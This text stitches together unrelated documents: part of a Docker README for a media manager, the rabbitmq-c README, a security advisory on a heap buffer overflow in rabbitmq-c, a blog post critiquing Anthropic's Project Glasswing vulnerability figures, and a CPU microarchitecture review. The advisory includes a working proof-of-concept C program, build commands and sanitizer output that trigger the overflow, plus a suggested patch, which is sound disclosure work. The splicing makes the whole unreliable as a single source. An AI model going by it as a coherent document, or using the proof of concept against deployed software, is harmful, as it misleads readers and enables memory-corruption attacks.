HolyArrs runs as. | | `-e TZ=America/New_York` | Your time zone, for the calendar, schedules and logs. `Etc/UTC` when left out. | | `-e UMASK=022` | Optional. Permission bits new files leave out. Use `002` when a group must write too. | | `-v /config` | Databases, settings, the master key, backups and logs. Local disk only, never a network share. | | `-v /movies` | Optional. A movie Library folder. | | `-v /tv` | Optional. A shows Library folder. | | `-v /music` | Optional. A music Library folder. | | `-v /downloads` | Optional. Your downloader's download folder. | | `--read-only=true` | Optional. Only `/config` and `/tmp` need to be writable. | | `--user=1000:1000` | Optional. Start as a fixed user. `PUID` and `PGID` are then ignored. | More variables (reverse proxy, URL base, save path): [Environment variables](https://docs.HolyArrs.com/reference/env-vars/). ### Environment variables from files Put `FILE__` in front of any variable to read its value from a file, such as a Docker secret: ```yaml environment: - FILE__HOLYARRS_ALLOWED_HOSTS=/run/secrets/holyarrs_hosts ``` ## User and group `PUID` and `PGID` must match the user that owns your media folders. Find them with: ```sh id youruser # uid=1000(youruser) gid=1000(youruser) ``` HolyArrs never changes the owner of your media or download folders. Give that user write access to them, because HolyArrs makes folders and moves files. ## Application setup Open `http://your-server:6262` and make the owner account right away. There is no default password. Until you make it, whoever opens HolyArrs first becomes the owner. The setup that opens next asks for your folders, a downloader and a Source. Guide: [First run](https://docs.HolyArrs.com/start/first-run/). ### Media folders The four optional mounts are the easy way to start. The cost: each mount is its own filesystem inside the container, so every import is a full copy. Want instant moves that take no extra space? Mount one parent folder with downloads and Library folders inside it, and give your downloader the same mount at the same path. Guide: [Folders](https://docs.HolyArrs.com/start/folders/). ### Docker Desktop on Windows and Mac Use a named volume for `/config`. Media folders can stay host folders. Guide: [Install](https://docs.HolyArrs.com/start/install/). ## Keep your master key safe `holyarrs.key` in your config folder is what opens your stored passwords and keys. Backups don't include it, so keep a copy somewhere else. As the owner, open **Settings > Backups** and choose **Download key kit**. See [Backups](https://docs.HolyArrs.com/run/backups/). ## Updating ```sh docker compose pull docker compose up -d ``` If the new version changes how data is stored, HolyArrs makes a backup first. To go back to it: `docker exec holyarrs /holyarrs restore --pre-update`, then `docker restart holyarrs`. Never remove `/config` during an update. See [Updates](https://docs.HolyArrs.com/run/updates/). ## Security - The owner account is made at first visit. There is no default password. - Stored passwords and keys are encrypted with `holyarrs.key`. - The image has no shell inside it. - Don't forward port 6262 on your router. Use a VPN such as Tailscale, or a reverse proxy with HTTPS. - Report security problems privately: [SECURITY](.github/SECURITY.md). ## Support info The image has no shell, so `docker exec -it holyarrs /bin/bash` won't work. HolyArrs' own commands do: - Follow the log: ```sh docker logs -f holyarrs ``` - Check your setup. Every line says `OK`, `WARN` or `FAIL`, and each `WARN` or `FAIL` says how to fix it: ```sh docker exec holyarrs /holyarrs doctor ``` - Locked out of the owner account: ```sh docker exec -i holyarrs /holyarrs reset-owner ``` - Version number: ```sh docker inspect --format '{{ index .Config.Labels "org.opencontainers.image.version" }}' holyarrs ``` ## Troubleshooting | You see | Do this | | --- | --- | | Permission denied on media folders | `PUID` and `PGID` don't match the owner of those folders. Run `id youruser`, put those numbers in compose and recreate the container. | | Errors with the config folder on a network share | The database needs a local disk. Move `/config` to a local path. Media folders on a share are fine. | | Port 6262 is already in use | Change the left side only, for example `6263:6262`, and open `http://your-server:6263`. | | HolyArrs can't reach qBittorrent or SABnzbd | Inside a container, `localhost` means the container itself. Use the downloader's container name on the same Docker network, or the host's IP address. | | Imports are copied | Mount one shared parent folder. See [Media folders](#media-folders). | More: [Troubleshooting](https://docs.HolyArrs.com/help/troubleshooting/). ## Where to ask | You have | Go to | | --- | --- | | A question | [Discord](https://discord.com/invite/mthsvesKpC) | | An idea or a vote | [r/HolyArrs](https://reddit.com/r/HolyArrs) and the [roadmap](https://holyarrs.com/roadmap/) | | A bug | [Issues](https://github.com/HolyArrs/HolyArrs/issues) (bugs and roadmap only) | | A security problem | [SECURITY](.github/SECURITY.md) | | Anything else | support@HolyArrs.com | ## Contributing Read [CONTRIBUTING](.github/CONTRIBUTING.md), then [Architecture](docs/dev/architecture.md) and [Setup](docs/dev/setup.md). Open an issue before a big change. On your first pull request a bot asks you to accept a short licence agreement ([CLA.md](.github/CLA.md)). - runs on amd64, arm64 and armv7
- works with qbittorrent, sabnzbd, plex, jellyfin, emby
- imports your sonarr/radarr setup, and speaks their api so seerr can keep talking to it
- no api keys to set up. posters and search come from a metadata server i run and pay for

# RabbitMQ C AMQP client library

![Build Status](https://github.com/alanxz/rabbitmq-c/actions/workflows/ci.yml/badge.svg)

[![Coverage Status](https://coveralls.io/repos/github/alanxz/rabbitmq-c/badge.svg?branch=master)](https://coveralls.io/github/alanxz/rabbitmq-c?branch=master)

[![Fuzzing Status](https://oss-fuzz-build-logs.storage.googleapis.com/badges/rabbitmq-c.svg)](https://oss-fuzz-build-logs.storage.googleapis.com/index.html#rabbitmq-c)

[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/7001/badge)](https://www.bestpractices.dev/projects/7001)

## Introduction

This is a C-language AMQP client library for use with v2.0+ of the
[RabbitMQ](http://www.rabbitmq.com/) broker.

 - <http://github.com/alanxz/rabbitmq-c>

Announcements regarding the library are periodically made on the
rabbitmq-c-users and cross-posted to rabbitmq-users.

 - <https://groups.google.com/forum/#!forum/rabbitmq-c-users>
 - <https://groups.google.com/forum/#!forum/rabbitmq-users>

## Latest Stable Version

The latest stable release of rabbitmq-c can be found at:

 - <https://github.com/alanxz/rabbitmq-c/releases/latest>

## Documentation

API documentation for v0.8.0+ can viewed from:

<http://alanxz.github.io/rabbitmq-c/docs/0.8.0/>

## Getting started

### Building and installing

#### Prereqs:
- [CMake v3.22 or better](http://www.cmake.org/)
- A C compiler (GCC 4.4+, clang, and MSVC are test. Other compilers may also
  work)
- *Optionally* [OpenSSL](http://www.openssl.org/) v1.1.1+ to enable support for
  connecting to RabbitMQ over SSL/TLS
- *Optionally* [POpt](http://freecode.com/projects/popt) to build some handy
  command-line tools.
- *Optionally* [XmlTo](https://fedorahosted.org/xmlto/) to build man pages for
  the handy command-line tools
- *Optionally* [Doxygen](http://www.stack.nl/~dimitri/doxygen/) to build
  developer API documentation.

After downloading and extracting the source from a tarball to a directory
([see above](#latest-stable-version)), the commands to build rabbitmq-c on most
systems are:

    mkdir build && cd build
    cmake ..
    cmake --build . [--config Release]

The --config Release flag should be used in multi-configuration generators e.g.,
Visual Studio or XCode.

It is also possible to point the CMake GUI tool at the CMakeLists.txt in the root of
the source tree and generate build projects or IDE workspace

Installing the library and optionally specifying a prefix can be done with:

    cmake -DCMAKE_INSTALL_PREFIX=/usr/local ..
    cmake --build . [--config Release] --target install

More information on CMake can be found on its FAQ (http://www.cmake.org/Wiki/CMake_FAQ)

Other interesting flags that can be passed to CMake:

* `BUILD_EXAMPLES=ON/OFF` toggles building the examples. OFF by default.
* `BUILD_SHARED_LIBS=ON/OFF` toggles building rabbitmq-c as a shared library.
   ON by default.
* `BUILD_STATIC_LIBS=ON/OFF` toggles building rabbitmq-c as a static library.
   ON by default.
* `BUILD_TESTING=ON/OFF` toggles building test code. ON by default.
* `BUILD_TOOLS=ON/OFF` toggles building the command line tools. By default
   this is ON if the build system can find the POpt header and library.
* `BUILD_TOOLS_DOCS=ON/OFF` toggles building the man pages for the command line
   tools. By default this is ON if BUILD_TOOLS is ON and the build system can
   find the XmlTo utility.
* `ENABLE_SSL_SUPPORT=ON/OFF` toggles building rabbitmq-c with SSL support. By
   default this is ON if the OpenSSL headers and library can be found.
* `BUILD_API_DOCS=ON/OFF` - toggles building the Doxygen API documentation, by
   default this is OFF
* `RUN_SYSTEM_TESTS=ON/OFF` toggles building the system tests (i.e. tests requiring 
   an accessible RabbitMQ server instance on localhost), by default this is OFF

## Building RabbitMQ - Using vcpkg

You can download and install RabbitMQ using the [vcpkg](https://github.com/Microsoft/vcpkg) 
dependency manager:

    git clone https://github.com/Microsoft/vcpkg.git
    cd vcpkg
    ./bootstrap-vcpkg.sh
    ./vcpkg integrate install
    ./vcpkg install librabbitmq

The RabbitMQ port in vcpkg is kept up to date by Microsoft team members and 
community contributors. If the version is out of date, 
please [create an issue or pull request](https://github.com/Microsoft/vcpkg) on the vcpkg repository.

## Running the examples

Arrange for a RabbitMQ or other AMQP server to be running on
`localhost` at TCP port number 5672.

In one terminal, run

    ./examples/amqp_listen localhost 5672 amq.direct test

In another terminal,

    ./examples/amqp_sendstring localhost 5672 amq.direct test "hello world"

You should see output similar to the following in the listener's
terminal window:

    Delivery 1, exchange amq.direct routingkey test
    Content-type: text/plain
    ----
    00000000: 68 65 6C 6C 6F 20 77 6F : 72 6C 64                 hello world
    0000000B:

## Writing applications using `librabbitmq`

Please see the `examples` directory for short examples of the use of
the `librabbitmq` library.

### Threading

You cannot share a socket, an `amqp_connection_state_t`, or a channel
between threads using `librabbitmq`. The `librabbitmq` library is
built with event-driven, single-threaded applications in mind, and
does not yet cater to any of the requirements of `pthread`ed
applications.

Your applications instead should open an AMQP connection (and an
associated socket, of course) per thread. If your program needs to
access an AMQP connection or any of its channels from more than one
thread, it is entirely responsible for designing and implementing an
appropriate locking scheme. It will generally be much simpler to have
a connection exclusive to each thread that needs AMQP service.

 Security 
 Advisories 
 GHSA-hfjv-vcp3-39wh 
 
 

 

 
 

 
 Heap Buffer Overflow in amqp_send_frame() When Serializing Oversized AMQP_FRAME_BODY
 

 

 


 
 
 Critical
 
 

 
 alanxz 
 published
 GHSA-hfjv-vcp3-39wh 
 Jul 2, 2026 

 
 
 
 


 

 
 
 
 
 
 
 
 
 
 Package 

 
 rabbitmq-c 
 

 
 Affected versions 

 <= 0.16.0 
 

 
 Patched versions 

 0.17.0 
 
 

 
 


 
 
 Description 
 

 
 
 Summary 
 A heap buffer overflow exists in rabbitmq-c when the public amqp_send_frame() API is used to serialize an oversized AMQP_FRAME_BODY . 
 The issue occurs because amqp_frame_to_bytes() copies frame.payload.body_fragment.len bytes into the connection outbound buffer without validating that the body fragment fits within the allocated frame buffer. An application that passes an oversized body frame to amqp_send_frame() can trigger a heap out-of-bounds write, resulting in process crash and memory corruption. 
 The issue is reproducible locally and occurs before any network communication with a RabbitMQ broker. 
 Details 
 The vulnerable code path is: 
 amqp_send_frame()
 -> amqp_send_frame_inner()
 -> amqp_frame_to_bytes()
 -> memcpy()
 
 In librabbitmq/amqp_connection.c , the AMQP_FRAME_BODY case serializes the body payload into the outbound frame buffer: 
 case AMQP_FRAME_BODY : {
 const amqp_bytes_t * body = & frame -> payload . body_fragment ;

 memcpy ( amqp_offset ( out_frame , HEADER_SIZE ),
 body -> bytes ,
 body -> len );

 out_frame_len = body -> len ;
 break ;
} 
 The issue is that body->len is trusted directly. There is no validation that the body payload length is smaller than the available capacity of the outbound frame buffer. 
 A newly created connection allocates an outbound buffer with a default size of 65536 bytes. However, the public API allows the caller to construct an amqp_frame_t manually and pass it to amqp_send_frame() . If the frame type is AMQP_FRAME_BODY and payload.body_fragment.len is larger than the outbound buffer capacity, memcpy() writes past the end of the heap allocation. 
 In the reproduced case: 
 body_fragment.len = 200000
outbound_buffer size = 65536
 
 This results in memcpy() attempting to copy 200000 bytes into a 65536-byte heap buffer. 
 The expected behavior is that amqp_send_frame() should reject the oversized frame and return an error such as AMQP_STATUS_BAD_AMQP_DATA , rather than corrupting heap memory. 
 Proof of Concept 
 The following PoC creates a new rabbitmq-c connection object, manually constructs an AMQP_FRAME_BODY , assigns a body length larger than the connection outbound buffer, and sends it through the public amqp_send_frame() API. 
 No RabbitMQ broker is required. The crash occurs locally during frame serialization before any socket write. 
 1. Build rabbitmq-c with AddressSanitizer 
 rm -rf build-asan

cmake -S . -B build-asan -G Ninja \
 -DBUILD_TESTING=OFF \
 -DBUILD_TOOLS=OFF \
 -DBUILD_EXAMPLES=OFF \
 -DBUILD_SHARED_LIBS=OFF \
 -DENABLE_SSL_SUPPORT=OFF \
 -DCMAKE_BUILD_TYPE=Debug \
 -DCMAKE_C_COMPILER=gcc \
 -DCMAKE_C_FLAGS= " -g -O1 -fsanitize=address,undefined -fno-omit-frame-pointer " \
 -DCMAKE_EXE_LINKER_FLAGS= " -fsanitize=address,undefined " 

cmake --build build-asan -j " $( nproc ) " 
 2. Create the PoC file 
 cat > poc_send_frame_body_oob.c << ' EOF ' 
 #include <rabbitmq-c/amqp.h> 
 #include <rabbitmq-c/framing.h> 
 #include <stdio.h> 
 #include <stdlib.h> 
 #include <string.h> 
 
 int main(void) { 
 amqp_connection_state_t conn = amqp_new_connection(); 
 if (conn == NULL) { 
 fprintf(stderr, "amqp_new_connection failed\n"); 
 return 1; 
 } 
 
 /* 
 * The default outbound buffer allocated by amqp_new_connection() 
 * is 65536 bytes. This body length is intentionally larger. 
 */ 
 size_t body_len = 200000; 
 
 char *body = malloc(body_len); 
 if (body == NULL) { 
 fprintf(stderr, "malloc failed\n"); 
 amqp_destroy_connection(conn); 
 return 1; 
 } 
 
 memset(body, 'A', body_len); 
 
 amqp_frame_t frame; 
 memset(&frame, 0, sizeof(frame)); 
 
 frame.frame_type = AMQP_FRAME_BODY; 
 frame.channel = 1; 
 frame.payload.body_fragment.bytes = body; 
 frame.payload.body_fragment.len = body_len; 
 
 printf("Sending BODY frame with len=%zu via amqp_send_frame()\n", body_len); 
 fflush(stdout); 
 
 /* 
 * Vulnerable call: 
 * 
 * amqp_send_frame() calls amqp_frame_to_bytes(), which copies 
 * body_fragment.len bytes into the connection outbound buffer 
 * without checking whether the body fits. 
 */ 
 int rc = amqp_send_frame(conn, &frame); 
 printf("amqp_send_frame returned rc=%d\n", rc); 
 
 free(body); 
 amqp_destroy_connection(conn); 
 return 0; 
 } 
 EOF 
 3. Compile the PoC 
 gcc -g -O1 -fsanitize=address,undefined -fno-omit-frame-pointer \
 -DAMQP_STATIC -DHAVE_CONFIG_H \
 -Iinclude \
 -Ibuild-asan/include \
 -Ibuild-asan/librabbitmq \
 -Ilibrabbitmq \
 poc_send_frame_body_oob.c \
 build-asan/librabbitmq/librabbitmq.a \
 -o poc_send_frame_body_oob 
 4. Run the PoC 
 ASAN_OPTIONS=abort_on_error=1:detect_leaks=0 \
UBSAN_OPTIONS=halt_on_error=1 \
./poc_send_frame_body_oob 
 5. Observed result 
 AddressSanitizer reports a heap-buffer-overflow write: 
 Sending BODY frame with len=200000 via amqp_send_frame()
=================================================================
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 200000

#0 memcpy
#1 amqp_frame_to_bytes
 librabbitmq/amqp_connection.c:467
#2 amqp_send_frame_inner
 librabbitmq/amqp_connection.c:548
#3 amqp_send_frame
 librabbitmq/amqp_connection.c:531
#4 main
 poc_send_frame_body_oob.c:35

0x7e9e30004800 is located 0 bytes after 65536-byte region
allocated by thread T0 here:
#0 realloc
#1 amqp_tune_connection
 librabbitmq/amqp_connection.c:140
#2 amqp_new_connection
 librabbitmq/amqp_connection.c:53
#3 main
 poc_send_frame_body_oob.c:8

SUMMARY: AddressSanitizer: heap-buffer-overflow
librabbitmq/amqp_connection.c:467 in amqp_frame_to_bytes
 
 This confirms that amqp_frame_to_bytes() attempts to copy 200000 bytes into an outbound heap buffer of 65536 bytes. 
 Why the PoC triggers the issue 
 The PoC performs the following steps: 
 
 Calls amqp_new_connection() . 
 This initializes a connection object and allocates the internal outbound frame buffer. 
 Allocates a 200000-byte body buffer filled with A bytes. 
 Creates an amqp_frame_t object manually. 
 Sets frame.frame_type to AMQP_FRAME_BODY . 
 Sets frame.payload.body_fragment.len to 200000 . 
 Calls the public amqp_send_frame() API. 
 amqp_send_frame() calls amqp_frame_to_bytes() . 
 In the AMQP_FRAME_BODY case, memcpy() copies body->len bytes into the outbound buffer without checking capacity. 
 Since the outbound buffer is only 65536 bytes, the copy writes past the end of the heap allocation. 
 
 Impact 
 This issue results in a heap out-of-bounds write and memory corruption inside the rabbitmq-c process. 
 Applications using the low-level public amqp_send_frame() API may be affected if attacker-controlled or insufficiently validated input is used to construct AMQP_FRAME_BODY frames. 
 The normal higher-level publishing API may avoid this by splitting message bodies into valid frame-sized chunks. However, the lower-level public frame-sending API does not enforce this bound for AMQP_FRAME_BODY . 
 Successful exploitation can cause process termination. Depending on the application environment and memory layout, the out-of-bounds write may also lead to broader memory corruption effects. 
 Suggested Fix 
 Before copying the body payload, validate that body->len does not exceed the available outbound buffer capacity. 
 A possible fix is: 
 case AMQP_FRAME_BODY : {
 const amqp_bytes_t * body = & frame -> payload . body_fragment ;
 size_t max_body_payload_size ;

 if ( buffer . len < HEADER_SIZE + FOOTER_SIZE ) {
 return AMQP_STATUS_BAD_AMQP_DATA ;
 }

 max_body_payload_size = buffer . len - HEADER_SIZE - FOOTER_SIZE ;

 if ( body -> len > max_body_payload_size ) {
 return AMQP_STATUS_BAD_AMQP_DATA ;
 }

 if ( body -> len > 0 && body -> bytes == NULL ) {
 return AMQP_STATUS_INVALID_PARAMETER ;
 }

 memcpy ( amqp_offset ( out_frame , HEADER_SIZE ), body -> bytes , body -> len );
 out_frame_len = body -> len ;
 break ;
} 
 With this validation, oversized body frames are rejected before the unsafe memcpy() call.

After 7-months, Glasswing Overwelms Maintainers with Underwhelming Findings | Blog | VulnCheck Products Government Resources Community Company Partners Sign In / Join Sign In Go back November 9, 2026 After 7-months, Glasswing Overwelms Maintainers with Underwhelming Findings Patrick Garrity in/patrickmgarrity/ ai cve kev VulnCheck Community gives you free access to VulnCheck KEV, NVD++, Initial Access Community, and VulnCheck XDB Join Now Key Takeaways: Seven months into Project Glasswing, VulnCheck has tracked 442 CVEs attributable to Anthropic, roughly 0.5% of all CVEs published this year, with only two identified as exploited in the wild.
Of Anthropic’s 37,966 reported findings, only 7,349 (19.4%) have been made public and just 217 have been marked fixed. Since September, Anthropic has added nearly 12,000 findings while recording just 15 additional fixes, widening the gap between discovery and remediation. Roughly 1,654 findings (4.4%) have been marked as duplicates, nearly eight times the number fixed, and another 419 have been withdrawn. Anthropic’s claimed true positive rate has risen from 90.8% to 94.2%, raising questions about how it accounts for duplicates and withdrawn findings. Anthropic’s OSS Scanner shifts validation work to maintainers, with curl rejecting 19 of 34 published reports as vulnerabilities, confirming six as low severity and leaving nine awaiting assessment. Also putting Anthropic's true positive rates into question. We're seven months into Anthropic's flagship Project Glasswing, and it's time for another update on the results. I've been tracking the project to see whether its claims are overhyped or grounded in reality. As we all recall, Anthropic launched Project Glasswing on April 7th, claiming, "We have identified thousands of additional high- and critical-severity vulnerabilities that we are working on responsibly disclosing to open source maintainers." What surprised me was how little evidence the project offered, which made me wonder whether this was more of an overhyped marketing campaign. That said, we shouldn't overlook that AI is an effective tool for finding vulnerabilities. But that story goes well beyond any single frontier model's capabilities. If you're just catching up, this builds on my earlier posts: Tracking CVEs Attributed to Anthropic Researchers and Project Glasswing - April 15 Observations on Anthropic's Vulnerability Disclosure Ledger - June 9 1H-2026 State of Exploitation Report - July 28 The Anthropic Glasswing Receipts Are Starting to Trickle In - September 8 So let's look at the results… Tracking Anthropic-Discovered Vulnerabilities I started tracking Anthropic's discovered vulnerabilities on April 17th, shortly after launch, in an open source repo called Anthropic Credited CVEs . The goal was to see whether Anthropic's claims lived up to the hype. This was before Anthropic launched its own disclosure ledger , which is only updated in infrequent bulk batches. My repo tracks every vulnerability attributable to Anthropic using CVE records, GHSAs, Linux kernel commits, and Anthropic's own ledger. I also manually audit advisories to catch CVEs that might otherwise get overlooked. After seven months, I've tracked 442 CVEs attributable to Anthropic. That's an average of just 63 per month. Out of the 93,450 CVEs published this year, that's only about 0.5% of all CVEs. For comparison, Anthropic's own public ledger lists just 217 fixed vulnerabilities, so I've tracked more than twice as many as Anthropic has disclosed itself. The Danger Narrative Isn't Adding Up You may recall that Glasswing launched with the message that we'd entered the Mythos era of vulnerability discovery. But are these vulnerabilities actually useful to attackers? To find out, I've been tracking Anthropic-discovered CVEs against VulnCheck KEV. So far, only 2 of the 442 have been exploited in the wild, just 0.45%. (CVE-2026-61500 and CVE-2026-26980) Anthropic's Ledger Continues to Underwhelm When Anthropic first launched its ledger in May, it reported 23,019 findings and a 90.8% true positive rate. As of its most recent update on November 2nd, there are 37,966 findings and just 217 fixes. That looks like a staggering failure to me, but let's take a closer look. Of the 37,966 findings Anthropic reports, only 7,349 (19.4%) have been made public. Just 217 of those have been marked fixed. The more glaring number is that 4.4% (1,654) of the project's findings have already been marked as duplicates, 7.5x more duplicates than fixes. On top of that, 419 findings have been withdrawn. It seems odd that the ledger now claims a 94.2% true positive rate, up from 90.8% at launch, when more findings have been withdrawn or marked as duplicates than fixed, likely a feedback loop missing to the triage rates listed as “True Positives”. The trend since my September update is even more telling: September 8 November 2 Change Total findings 26,153 37,966 +11,813 Made public 2,736 (10.5%) 7,349 (19.4%) +4,613 Fixed 202 217 +15 Withdrawn 245 419 +174 Duplicates 2 1,670 +1,668 Claimed true positive rate 91.4% 94.2% +2.8 pts In two months, Anthropic added nearly 12,000 findings and fixed just 15 more. Duplicates went from two to thousands, which is exactly what I warned about in September: the longer findings sit, the more likely someone else finds and fixes them first. I don't know how anyone can read these numbers as anything but damning. You may also notice a correction in my visual. There appears to be a bug on Anthropic's ledger that inflates the number of findings marked as disclosed. Check for yourself using the "disclosed" filter. Anthropic's Pivot to OSS Scanner Having humans triage every finding clearly didn't scale, and Anthropic has said as much. In its OSS Scanner launch post on October 8th, Anthropic said it had found more than 29,000 candidate vulnerabilities but had manually reviewed only about 6,000, and that it remains "bottlenecked on our human capacity to validate these findings." It had also already sent nearly 5,000 unverified reports to maintainers who asked for everything in bulk. So with the Glasswing open source initiative hitting a wall, launching a self-service OSS Scanner that projects can opt into makes sense. Maintainers can now request a scan and triage the findings themselves. Anthropic is upfront that these reports are "fully model-generated, without human review or triage" and that "it is possible reports will be incorrect or invalid." In other words, the triage bottleneck didn't go away. It moved to the maintainers. If the true positive rate is really as high as Anthropic claims, that shouldn't be a problem. curl Gives Anthropic's OSS Scanner a Reality Check Three days ago, Daniel Stenberg , who maintains curl, announced that the project had received a batch of 45 vulnerability reports from Anthropic. Anthropic rated only one as medium severity and the rest as low. Daniel is moving them over to GitHub at a deliberate pace "to soften the impact for the team," with plans to have them all published by the end of the week. This gives us a rare look at what Anthropic's findings look like once a maintainer actually validates them. Of the 34 reports published so far, 19 have been marked as not a vulnerability, 6 have been confirmed as low severity, and 9 are still awaiting assessment. That puts the false positive rate at 55.9% so far, and only 17.6% of findings have been confirmed, all of them low severity. That's a lot of work dumped on open source maintainers for a small handful of low-impact bugs, and when a maintainer has to pace reports just to protect his team, that says plenty about the burden. This also isn't new for curl. Back in May, Daniel wrote that five Mythos findings boiled down to a single confirmed vulnerability. It's a far cry from the 94.2% true positive rate Anthropic currently claims on its ledger. It also undercuts the "high- and critical-severity" framing Glasswing launched with. In September, I found that Claude rated 91.5% of ledger findings as critical or high, while maintainers rated only 51.3% that way. I'm curious whether other open source projects are seeing the same thing. curl took a bold move by deciding to publish low and medium vulnerabilities findings publicly as issues for full transparency and we encourage other open source maintainers to follow their lead. Takeaways After Seven Months AI is a valuable tool for finding vulnerabilities, and I'm not discounting that. But seven months in, the evidence still doesn't match the launch narrative. The CVEs are a sliver of this year's total, almost none are being exploited, fixes have stalled while duplicates and withdrawals pile up, and the triage burden is shifting onto the open source maintainers Glasswing promised to help. The receipts keep coming in. They still don't reconcile. AMD’s Zen 6 Family: Feeding the Beast - by George Cozma 
 
 
 
 
 

 

 

 
 
 
 
 
 
 
 
 

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
 
 
 
 
 
 
 
 
 
 

 

 

 

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 

 
 
 

 
 
 
 
 
 

 

 
 
 
 
 

 

 

 

 

 
 

 
 

 

 

 
 Chips and Cheese Subscribe Sign in AMD’s Zen 6 Family: Feeding the Beast George Cozma Nov 10, 2026 39 6 Share Hello you fine Internet folks, Today we’re looking at AMD’s next-generation Zen 6 CPU core family. We’ll explore the changes from Zen 5 and what the differences between Zen 6 and Zen 6c tell us about AMD’s approach to microarchitecture. Hope y’all enjoy! Overview From a bird's eye view, Zen 6 is the natural evolution of Zen5, with the expansion of many OoO structures and iterative improvements found throughout the core. Digging in deeper however tells a different story, with AMD heavily re-working several parts of the core, reminding me of the changes from Zen 1 to Zen 2. At a high level the changes AMD made to the integer schedules stand out, returning to a layout reminiscent of Zen 3 and Zen 4. Branch Prediction Zen 5 had the best direction predictor of any core we have measured and Zen 6 seemingly builds upon that same direction predictor. The biggest difference we do see is in what happens once the direction predictor gets overwhelmed. Both cores hit that wall in about the same place and past it, the predictor is left guessing at random data, so the time per branch mostly reflects how long the core takes to recover from a wrong guess. That plateau sits at roughly 3.5 to 4 ns of extra time per branch on Zen 5 and roughly 3 to 3.5 ns on Zen 6 so Zen 6 is paying less for each branch it gets wrong, which speaks to AMD reducing the latency of a branch mispredict compared to Zen 5. Zen 6 has also improved the ability of the core to do 2 branches per cycle with Zen 6 able to do 2 branches per cycle within the L1 instruction cache. When the footprint exceeds the L1i, then it falls to just a single branch per cycle for the rest of the BTB except for the 64B test which goes up to 4 cycles per branch for the L2 BTB. When comparing the BTB of Zen 6 to Zen 5, Zen 6 appears to have focused on improving the speed of the BTB compared to beefing up the capacity. The accuracy of Zen 6’s Branch Predictor Unit is very similar to Zen 5’s while also being faster which is a good thing considering that Zen 5 already had a very accurate Branch Predictor. Instruction Fetch Zen 6 carries forward the same dual decode cluster schema that Zen 5 introduced but, unlike Zen 5 where a single thread could only effectively use a single decode cluster, now with Zen 6 a single thread can use both decode clusters. Outside of the L1i, Zen 6 looks very similar to Zen 5’s behavior on the instruction side of things. Execution Engine The execution engine of Zen 6 is overall very similar to Zen 5, but there are some important differences to be mindful of. On the integer side, Zen 6 brings back Zen 4’s NOP pairing behavior, retiring up to 16 NOPs per cycle. Zen 6 also comes closer to theoretical peak throughput for simple integer instructions than Zen 5, sustaining 5.96 64-bit adds per cycle against Zen 5’s 5.25 with the same six ALUs. AMD has reduced the number of integer multiply units from three to two, with PDEP and PEXT throughput also falling from three instructions per cycle to two. According to AMD, Zen 5’s third integer multiply unit did not justify its area cost. On the vector side, the floating-point units are unchanged, with Zen 6 still handling two 512-bit FADDs, FMULs, or FMAs per cycle. The change is in VNNI, where Zen 6 doubles the number of units from two to four and our 512-bit VNNI test goes from 1.99 to 3.88 instructions per cycle, with Zen 6c matching it. VNNI instructions are useful for operations like calculating the inner loop of quantized inference as well as for video codecs using them for video filters as well. Moving over to the other notable change, Zen 5 could already perform four per cycle, but our test shows only two of them could be vector loads, regardless of if they were 256 or 512 bit loads. Zen 6 raises 256-bit loads to four per cycle on both cores while leaving 512-bit loads at two, so both widths now reach the same 128 bytes per cycle which matters because most shipped vector code still targets AVX1/2. The Out of Order Engine: Where Zen 6 and Zen 6c Split In the past the difference between the Classic cores and the Dense cores in terms of the architecture were, for all intents and purposes, functionally identical with the biggest changes being in the number of cores on a CCD and the amount of L3 cache per core. With the Zen 6 family, that has changed. Starting inside of the core, the changes occur after micro-op dispatch and seemingly end after the load queue. The main differences between Zen 6 and Zen 6c lie in the capacities of their out-of-order structures. Several of these structures are larger on Zen 6c, allowing it to keep more work in flight and absorb more latency than Zen 6. The reorder buffer grows from 576 to 640 entries, the integer register file from 288 to 352, the vector scheduler from 138 to 180, and the load queue from 280 to 330. The differences suggest that AMD is specializing the two designs. Zen 6 appears tuned for high frequency, while Zen 6c has more capacity to tolerate comparatively high memory latency. Zen 6 and Zen 6c use 12-core and 32-core CCDs, respectively, but both provide 4 MB of L3 cache per core. That gives the 12-core CCD 48 MB of L3 cache and the 32-core CCD 128 MB. L3 latency has increased from about 47 cycles on Zen 5 to 55 cycles on Zen 6 and 66 cycles on Zen 6c. The larger caches and greater number of mesh stops likely contribute to the increase. In nanoseconds, Zen 6’s higher clock hides most of the increase, at 10.7 ns against 10.3 ns on the Zen 5-based EPYC 9355P, while Zen 6c’s lower clock and larger CCX put it at 16.4 ns. Moving over to bandwidth, we see that Zen 6 fixes Zen 5’s odd L2 bandwidth behavior, where a core pulled only about 42 bytes per cycle across most of the L2’s capacity, in Zen 6 the read path now reliably delivers 64 bytes per cycle. The rest of the cache hierarchy is largely unchanged in bandwidth per cycle. Load/Store Store-to-load forwarding is seemingly unchanged from Zen 5 and is where the behavior of Zen 6 and Zen 6c re-unify. EPYC 9686F (Zen 6) STLF test EPYC 9996 (Zen 6c) STLF test Zen 5 STLF test A 32-bit load from the same address as a 64-bit store completes with effectively zero latency which lets Zen 6 handle two dependent store-load pairs per cycle. Loads fully contained within the store complete in 7 cycles regardless of alignment with partial overlaps costing 14 cycles, matching Zen 5. SPEC CPU 2026 Performance The EPYC 9686F is near the top of our estimated single-threaded SPEC CPU 2026 results. It roughly matches the Ryzen 9 9950X3D2, AMD’s highest-end client CPU from the previous generation, in integer rate and beats it in floating-point rate. At a matched 4.1 GHz, the 9686F leads the 9950X3D2 by about 4% in integer and 11% in floating point, despite the X3D part’s much larger L3. The EPYC 9996 is no slouch either. It roughly matches the previous-generation EPYC 9575F in single-threaded performance, despite running at lower clocks and having four times as many cores. It also edges out NVIDIA’s Vera in integer and leads it by about 20% in floating point. The EPYC 9686F leads on almost every subtest and finishes about 18% ahead of the EPYC 9996 in both suites. It scores 6.20 versus 5.25 in integer and 10.6 versus 8.99 in floating point, with some of its largest leads in 714.cpython, 766.femflow, and 772.marian. Against the Zen 5-based EPYC 9575F, the 9996 scores 5.25 versus 5.13 in integer and 8.99 versus 9.01 in floating point while running about 900 MHz slower. 